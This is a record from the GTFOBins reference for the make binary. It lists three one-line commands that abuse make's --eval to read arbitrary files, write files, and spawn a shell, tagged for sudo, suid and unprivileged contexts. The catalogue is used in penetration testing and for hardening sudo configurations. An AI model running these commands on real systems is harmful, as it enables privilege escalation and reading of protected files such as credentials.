{"title": "make", "source": "gtfobins", "source_label": "GTFOBins", "path": "make", "html": "<h1>make</h1>\n<h2>File Read</h2>\n<pre><code class=\"language-bash\">make -s --eval=&#x27;$(file &gt;/dev/stdout,$(file &lt;/path/to/input-file))&#x27; .</code></pre>\n<h2>File Write</h2>\n<pre><code class=\"language-bash\">make -s --eval=&#x27;$(file &gt;/path/to/output-file,DATA)&#x27; .</code></pre>\n<h2>Shell</h2>\n<pre><code class=\"language-bash\">make --eval=&#x27;$(shell /bin/sh 1&gt;&amp;0)&#x27; .</code></pre>", "excerpt": "make File Read make -s --eval=&#x27;$(file &gt;/dev/stdout,$(file &lt;/path/to/input-file))&#x27; . File Write make -s --eval=&#x27;$(file &gt;/path/to/output-file,DATA)&#x27; . Shell make --eval=&#x27;$(shell /bin/sh 1&gt;&amp;0)&#x27; .", "tags": ["func:file-read", "func:file-write", "func:shell", "ctx:sudo", "ctx:suid", "ctx:unprivileged"]}